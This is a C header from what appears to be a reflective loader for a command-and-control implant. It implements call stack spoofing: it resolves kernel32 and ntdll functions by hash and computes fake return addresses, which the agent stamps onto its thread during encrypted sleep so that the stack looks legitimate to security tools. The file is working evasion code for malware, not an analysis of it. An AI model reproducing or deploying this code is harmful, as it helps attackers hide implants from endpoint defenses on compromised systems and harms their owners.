#ifndef UDRL_SPOOF_THREAD_2FRAME_H
#define UDRL_SPOOF_THREAD_2FRAME_H

#include "pic_defs.h"

/* ──────────────────────────────────────────────────────────────────────
 * Thread 2-Frame Call Stack Spoof Profile
 *
 * Standard 2-frame stack that mimics a legitimate thread start:
 *   - kernel32!BaseThreadInitThunk+0x14
 *   - ntdll!RtlUserThreadStart+0x21
 *
 * Applied to the agent's main thread before sleeping so the call
 * stack appears legitimate during the encrypted sleep period.
 * ────────────────────────────────────────────────────────────────────── */

typedef struct _SPOOF_FRAME_DEF {
    DWORD module_hash;
    DWORD func_hash;
    DWORD offset;
} SPOOF_FRAME_DEF;

#define SPOOF_FRAME_COUNT 2

static SPOOF_FRAME_DEF PICFN spoof_frames[SPOOF_FRAME_COUNT] = {
    {
        0,  /* kernel32.dll - filled at runtime */
        0,  /* BaseThreadInitThunk - filled at runtime */
        0x14
    },
    {
        0,  /* ntdll.dll - filled at runtime */
        0,  /* RtlUserThreadStart - filled at runtime */
        0x21
    },
};

static void PICFN populate_spoof_frames(void) {
    /* Frame 0: kernel32!BaseThreadInitThunk+0x14 */
    spoof_frames[0].module_hash = fnv1a_hash_w(L"kernel32.dll");
    spoof_frames[0].func_hash  = fnv1a_hash_a("BaseThreadInitThunk");

    /* Frame 1: ntdll!RtlUserThreadStart+0x21 */
    spoof_frames[1].module_hash = fnv1a_hash_w(L"ntdll.dll");
    spoof_frames[1].func_hash  = fnv1a_hash_a("RtlUserThreadStart");
}

/*
 * resolve_spoof_addresses - Resolve actual addresses for spoof frames.
 *
 * Returns an array of computed return addresses (module_base + func + offset).
 * The caller stamps these onto the stack/CONTEXT before sleeping.
 */
static void PICFN resolve_spoof_addresses(PVOID out_addrs[SPOOF_FRAME_COUNT]) {
    populate_spoof_frames();

    for (int i = 0; i < SPOOF_FRAME_COUNT; i++) {
        PVOID mod = resolve_module(spoof_frames[i].module_hash);
        if (!mod) {
            out_addrs[i] = NULL;
            continue;
        }
        PVOID func = resolve_api(mod, spoof_frames[i].func_hash);
        if (!func) {
            out_addrs[i] = NULL;
            continue;
        }
        out_addrs[i] = (PVOID)((BYTE *)func + spoof_frames[i].offset);
    }
}

#endif /* UDRL_SPOOF_THREAD_2FRAME_H */
